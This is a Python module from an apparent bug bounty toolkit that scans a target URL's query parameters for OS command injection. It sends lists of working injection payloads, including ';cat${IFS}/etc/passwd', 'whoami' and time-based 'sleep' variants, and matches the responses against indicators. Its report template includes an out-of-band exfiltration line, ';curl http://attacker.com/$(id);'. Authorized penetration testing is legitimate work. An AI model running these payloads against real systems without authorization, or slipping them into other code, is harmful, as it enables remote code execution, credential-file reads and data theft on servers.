# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""Command Injection — output-based, time-based blind, polyglot payloads."""

import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

OS_PAYLOADS = [
    # Unix separators
    ";id", "|id", "||id", "&id", "&&id",
    ";whoami", "|whoami", "||whoami",
    "`id`", "$(id)", "${IFS}id",
    ";uname${IFS}-a", "|uname${IFS}-a",
    ";cat${IFS}/etc/passwd", "|cat${IFS}/etc/passwd",
    ";echo${IFS}HACKER00X1", "|echo${IFS}HACKER00X1",
    # Windows
    "&whoami", "&&whoami", "|whoami", "&dir", "|dir",
    "&type%20C:\\Windows\\win.ini",
    "&&type%20C:\\Windows\\win.ini",
    # Newline / special
    "\nid\n", "\r\nid\r\n", "%0aid", "%0d%0aid",
    # URL-encoded
    "%3Bid", "%7Cid", "%26id", "%3Bwhoami", "%7Cwhoami",
    # Polyglot
    "a;id;b", "a|id|b", "a&&id&&b",
    "$(id)#", "`id`#",
    "1;id", "1|id", "1&id",
    # Blind confirm
    ";echo HACKER00X1", "|echo HACKER00X1",
    "$(echo HACKER00X1)", "`echo HACKER00X1`",
]

TIME_PAYLOADS = [
    (";sleep 3",                   3),
    ("|sleep 3",                   3),
    ("||sleep 3",                  3),
    ("&&sleep 3",                  3),
    ("`sleep 3`",                  3),
    ("$(sleep 3)",                 3),
    ("${IFS}sleep${IFS}3",         3),
    (";ping${IFS}-c${IFS}3${IFS}127.0.0.1", 3),
    ("& ping -n 3 127.0.0.1 &",   3),
    ("%3Bsleep%203",               3),
    ("%7Csleep%203",               3),
    ("1;sleep 3;",                 3),
]

INDICATORS = [
    "uid=", "gid=", "root", "www-data", "nobody", "apache", "nginx",
    "root:x:", "/bin/bash", "/bin/sh", "linux", "darwin", "windows",
    "microsoft", "volume in drive", "[extensions]", "HACKER00X1",
    "directory of", "drwxr", "total 0",
]

CVSS_CRIT = "10.0 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"


def _test_param(base_url: str, param: str, orig_val: str, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    def _build(v):
        q = dict(qs); q[param] = [v]
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)))

    for payload in OS_PAYLOADS:
        url = _build(orig_val + payload)
        resp = fetch_url(url, timeout=timeout)
        if not resp:
            continue
        body = resp.get("body") or ""
        hit = next((ind for ind in INDICATORS if ind in body), None)
        if hit:
            return [{
                "type": "Command Injection (Output-Based)",
                "severity": "CRITICAL",
                "url": url,
                "param": param,
                "payload": payload,
                "indicator": hit,
                "cvss": CVSS_CRIT,
                "description": f"OS command injection in '{param}': indicator '{hit}' found in response body.",
                "steps_to_reproduce": (
                    f"1. curl -s '{url}'\n"
                    f"2. Observe '{hit}' in response — OS command executed server-side."
                ),
                "impact": "Full Remote Code Execution. Attacker controls the server OS.",
                "recommendation": "Never pass user input to OS functions (system, exec, popen). Use language-native APIs. If unavoidable, use strict allowlists and shell=False.",
            }]

    for payload, delay in TIME_PAYLOADS:
        url = _build(orig_val + payload)
        t0 = time.time()
        fetch_url(url, timeout=max(timeout, delay + 3))
        elapsed = time.time() - t0
        if elapsed >= delay - 0.5:
            return [{
                "type": "Command Injection (Time-Based Blind)",
                "severity": "CRITICAL",
                "url": url,
                "param": param,
                "payload": payload,
                "delay_observed": round(elapsed, 2),
                "cvss": CVSS_CRIT,
                "description": f"Blind command injection in '{param}': sleep({delay}s) caused {elapsed:.1f}s delay.",
                "steps_to_reproduce": (
                    f"1. curl -s '{url}' → observe {elapsed:.1f}s response time\n"
                    "2. Normal baseline should be <1s\n"
                    "3. Confirm with OOB: ;curl http://attacker.com/$(id);"
                ),
                "impact": "Blind RCE — exfiltrate data via DNS/HTTP OOB, install backdoors.",
                "recommendation": "Remove all OS command execution from user-controlled data paths. Code review all exec/shell calls.",
            }]

    return []


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 10, **kwargs) -> dict:
    findings: list[dict] = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    if not qs:
        return {"findings": [], "summary": {"params_tested": 0, "note": "No query params found."}}

    with ThreadPoolExecutor(max_workers=min(threads, len(qs))) as ex:
        futures = {ex.submit(_test_param, base_url, p, qs[p][0], timeout): p for p in qs}
        for fut in as_completed(futures):
            findings.extend(fut.result())

    return {
        "findings": findings,
        "summary": {
            "params_tested": len(qs),
            "os_payloads": len(OS_PAYLOADS),
            "time_payloads": len(TIME_PAYLOADS),
            "vulnerable": len(findings),
        },
    }


if __name__ == "__main__":
    pass
